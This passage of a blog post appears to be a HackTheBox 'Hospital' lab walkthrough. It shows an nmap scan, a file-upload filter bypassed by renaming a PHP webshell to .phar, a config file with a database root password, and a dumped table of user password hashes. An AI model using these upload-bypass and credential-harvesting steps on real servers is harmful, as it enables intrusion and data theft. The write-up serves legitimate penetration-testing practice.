<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hospital" /><meta property="og:locale" content="en" /><meta name="description" content="Machine Link https://app.hackthebox.com/machines/Hospital Operating System Windows + Linux Difficulty Medium Machine Created by ruycr4ft" /><meta property="og:description" content="Machine Link https://app.hackthebox.com/machines/Hospital Operating System Windows + Linux Difficulty Medium Machine Created by ruycr4ft" /><link rel="canonical" href="https://strongshiv8.github.io/posts/Hospital/" /><meta property="og:url" content="https://strongshiv8.github.io/posts/Hospital/" /><meta property="og:site_name" content="StrongShiv8" /><meta property="og:image" content="https://pbs.twimg.com/media/F_D4Z-xXYAABRzU.jpg" /><meta property="og:image:height" content="630" /><meta property="og:image:width" content="1200" /><meta property="og:image:alt" content="Linux + Windows combine machine with Medium Level difficulties üè•" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-04-03T00:00:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://pbs.twimg.com/media/F_D4Z-xXYAABRzU.jpg" /><meta name="twitter:image:alt" content="Linux + Windows combine machine with Medium Level difficulties üè•" /><meta property="twitter:title" content="Hospital" /><meta name="twitter:site" content="@StrongShiv8" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-10-03T12:31:00+05:30","datePublished":"2024-04-03T00:00:00+05:30","description":"Machine Link https://app.hackthebox.com/machines/Hospital Operating System Windows + Linux Difficulty Medium Machine Created by ruycr4ft","headline":"Hospital","image":{"width":"1200","height":"630","alt":"Linux + Windows combine machine with Medium Level difficulties üè•","url":"https://pbs.twimg.com/media/F_D4Z-xXYAABRzU.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://strongshiv8.github.io/posts/Hospital/"},"url":"https://strongshiv8.github.io/posts/Hospital/"}</script><title>Hospital | StrongShiv8</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="StrongShiv8"><meta name="application-name" content="StrongShiv8"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script src="/assets/js/progress.js" defer></script> <script src="/assets/js/auto-update.js" defer></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar/avatar.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">StrongShiv8</a><p class="site-subtitle fst-italic mb-0">OSCP | eJPTv2 | Cyber Security Fanatic</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/StrongShiv8" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/StrongShiv8" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://app.hackthebox.com/users/595651" aria-label="hackthebox" target="_blank" rel="noopener noreferrer" > <i class="fa-solid fa-cube"></i> </a> <a href="https://www.linkedin.com/in/shivendra-prajapati-a788401a5/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Hospital</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Hospital</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1712082600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 3, 2024 </time> </span> <span> Updated <time data-ts="1727938860" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 3, 2024 </time> </span><div class="mt-3 mb-3"> <a href="https://pbs.twimg.com/media/F_D4Z-xXYAABRzU.jpg" class="popup img-link preview-img shimmer"><img src="https://pbs.twimg.com/media/F_D4Z-xXYAABRzU.jpg" alt="Linux + Windows combine machine with Medium Level difficulties üè•" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">Linux + Windows combine machine with Medium Level difficulties üè•</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2145 words" > <em>11 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Hospital</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Hospital</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><div class="table-wrapper"><table><thead><tr><th>Machine Link<th><a href="https://app.hackthebox.com/machines/Hospital">https://app.hackthebox.com/machines/Hospital</a><tbody><tr><td>Operating System<td><mark style="background: #ADCCFFA6;"> Windows </mark> + Linux<tr><td>Difficulty<td><mark style="background: #FFB86CA6;"> Medium </mark><tr><td>Machine Created by<td><a href="https://app.hackthebox.com/users/1253217">ruycr4ft</a></table></div><h2 id="port-scan-results-Ô∏è"><span class="me-2">Port Scan Results ‚§µÔ∏è</span><a href="#port-scan-results-Ô∏è" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash nolineno nolineno highlighter-rouge" file="Nmap_Results.txt"><div class="code-header"> <span data-label-text="Nmap_Results.txt"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kaliüî•kali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-oN</span> Nmap_Results.txt 10.10.11.241
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-15 13:05 IST
Nmap scan report <span class="k">for </span>10.10.11.241
Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65506 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-02-15 14:44:47Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
| tls-alpn: 
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-15T14:45:46+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Not valid before: 2024-02-05T12:02:41
|_Not valid after:  2024-08-06T12:02:41
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6056/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6615/tcp open  msrpc             Microsoft Windows RPC
6635/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.55 <span class="o">(</span>Ubuntu<span class="o">)</span>
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Hosts: DC, 127.0.1.1<span class="p">;</span> OSs: Linux, Windows<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2024-02-15T14:45:44
|_  start_date: N/A
|_clock-skew: mean: 6h59m48s, deviation: 0s, median: 6h59m47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
</pre></table></code></div></div><h2 id="web-enumeration-Ô∏è"><span class="me-2">Web Enumeration ‚§µÔ∏è</span><a href="#web-enumeration-Ô∏è" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I enumerated port 443 and got this login page where the default credentials where not working . <a href="/assets/images/Pasted%20image%2020240215134246.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240215134246.png" alt="Image" loading="lazy"></a> <em>Checking port 443</em></p><p>I then checked port 8080 and got this login page again but this time I have the options to register myself like this ‚§µÔ∏è <a href="/assets/images/Pasted%20image%2020240219152613.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219152613.png" alt="Image" loading="lazy"></a> <em>Register Page at port 8080</em> <a href="/assets/images/Pasted%20image%2020240219152756.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219152756.png" alt="Image" loading="lazy"></a> <em>My Login credentials will be my username strongshiv8</em></p><p>Now I have an option to upload a file so lets exploit that functionality lets see its file upload is vulnerable or not ‚è¨ <a href="/assets/images/Pasted%20image%2020240219152911.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219152911.png" alt="Image" loading="lazy"></a> <em>Upload a document over here !</em> I uploaded the php webshell file and changed its extension to phar as it gets bypass sometimes and also works that‚Äôs why. Looks like it got uploaded üîª <a href="/assets/images/Pasted%20image%2020240219153357.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219153357.png" alt="Image" loading="lazy"></a> <em>Uploaded successfully !</em> Lets load the files I think I can find this file in <code class="language-plaintext highlighter-rouge">/upload/</code> directory :<br /> <a href="/assets/images/Pasted%20image%2020240219153707.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219153707.png" alt="Image" loading="lazy"></a> <em>Restricted by the server</em> So I guessed that I should try to load the file name with it also and I got it üîΩ <a href="/assets/images/Pasted%20image%2020240219153844.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219153844.png" alt="Image" loading="lazy"></a> <em>PHP Webshell by p0wnyshell</em> Now lets have a proper shell with reverse shell through netcat command ‚è¨</p><div class="language-php nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">webserver</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="err">$</span> <span class="n">cat</span> <span class="n">config</span><span class="mf">.</span><span class="n">php</span>
<span class="n">cat</span> <span class="n">config</span><span class="mf">.</span><span class="n">php</span>
<span class="o">&lt;?</span><span class="n">php</span>
<span class="cm">/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_SERVER'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USERNAME'</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'my$qls3rv1c3!'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'hospital'</span><span class="p">);</span>
 
<span class="cm">/* Attempt to connect to MySQL database */</span>
<span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="no">DB_SERVER</span><span class="p">,</span> <span class="no">DB_USERNAME</span><span class="p">,</span> <span class="no">DB_PASSWORD</span><span class="p">,</span> <span class="no">DB_NAME</span><span class="p">);</span>
 
<span class="c1">// Check connection</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$link</span> <span class="o">===</span> <span class="kc">false</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"ERROR: Could not connect. "</span> <span class="mf">.</span> <span class="nf">mysqli_connect_error</span><span class="p">());</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
www-data@webserver:/var/www/html$ 
</pre></table></code></div></div><p>I got the credentials for mysql service lets move further ‚è¨ I logged into the mysql server and got this data from hospital database ‚è¨</p><div class="language-sql nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">hospital</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----+-------------+--------------------------------------------------------------+---------------------+</span>
<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span>    <span class="o">|</span> <span class="n">password</span>                                                     <span class="o">|</span> <span class="n">created_at</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">----+-------------+--------------------------------------------------------------+---------------------+</span>
<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>       <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG</span><span class="p">.</span><span class="mi">3</span><span class="n">NLrxcjMh2</span> <span class="o">|</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">21</span> <span class="mi">14</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">patient</span>     <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">a</span><span class="p">.</span><span class="n">lNstD7JdiNYxEepKf1</span><span class="o">/</span><span class="n">OZ5EM5wngYrf</span><span class="p">.</span><span class="n">m5RxXCgSud7MVU6</span><span class="o">/</span><span class="n">tgO</span> <span class="o">|</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">21</span> <span class="mi">15</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">11</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">harlock</span>     <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="mi">24</span><span class="n">OV</span><span class="o">/</span><span class="mi">426</span><span class="n">MYhewTzI66fkSui9MTJjvtvOWVuOYglwrqN</span><span class="o">/</span><span class="p">.</span><span class="n">vmzR4W9i</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">regis</span>       <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">AjjBmzMwKOQvJlXxHd6tvu3jdH7opxjZfMPIa1KYIOKZjduM18Ch</span><span class="p">.</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">21</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">03</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">5</span> <span class="o">|</span> <span class="n">M4d2</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">KwaY2owXUM</span><span class="o">/</span><span class="n">IHIaSpQTxH</span><span class="p">.</span><span class="n">CTV22wxng</span><span class="o">/</span><span class="n">J9</span><span class="p">.</span><span class="n">fjYta394syRLKub3cO</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">02</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">47</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">6</span> <span class="o">|</span> <span class="n">Z43L</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="mi">45</span><span class="n">xTJMMOxYJkGfez4eO5geE6Wru7s0UGlaZ2KYX08FHfgT85gD6H</span><span class="p">.</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">03</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">35</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">7</span> <span class="o">|</span> <span class="n">Z43Lz</span>       <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">kM2QMx9xJPWcWFBGJD</span><span class="o">/</span><span class="n">w1eT3</span><span class="o">/</span><span class="n">p3WZ58</span><span class="p">.</span><span class="mi">8</span><span class="n">fraEe</span><span class="p">.</span><span class="n">Ul9d</span><span class="p">.</span><span class="n">L6vHByCKW</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">03</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">13</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">8</span> <span class="o">|</span> <span class="n">post</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">HnPpvRldaJWTKHKp2m9xduAv</span><span class="p">..</span><span class="n">KSK3b0brL0BfKWqZ8LYTzHmRtcW</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">03</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">23</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">9</span> <span class="o">|</span> <span class="n">test</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">CaLia00lbvrMfxDzQZQlW</span><span class="p">.</span><span class="mi">4</span><span class="n">dfTjCmdTds7fvnADLuKOSyh2YUc8UC</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">20</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">10</span> <span class="o">|</span> <span class="n">hacker</span>      <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">YLYDbRnYO6p8aVX5oVW3ne0q7szENOqxxaMaR384o8XH3v</span><span class="p">.</span><span class="mi">2</span><span class="n">nOD86</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">54</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">11</span> <span class="o">|</span> <span class="n">pwned</span>       <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">Y25Ty3H3Crqw0NtYCt9NguG9iaBD</span><span class="p">..</span><span class="n">fXPsBNcVT6esnQ00Ycu2s0O</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">54</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">12</span> <span class="o">|</span> <span class="n">deadpoop</span>    <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="mi">1</span><span class="n">MnUbxgFnMsg6J1efOqQdeiyPWMBg1fTED7E0Tkz8XcHfG9</span><span class="o">/</span><span class="n">zWoVK</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span> <span class="mi">18</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">34</span> <span class="o">|</span>
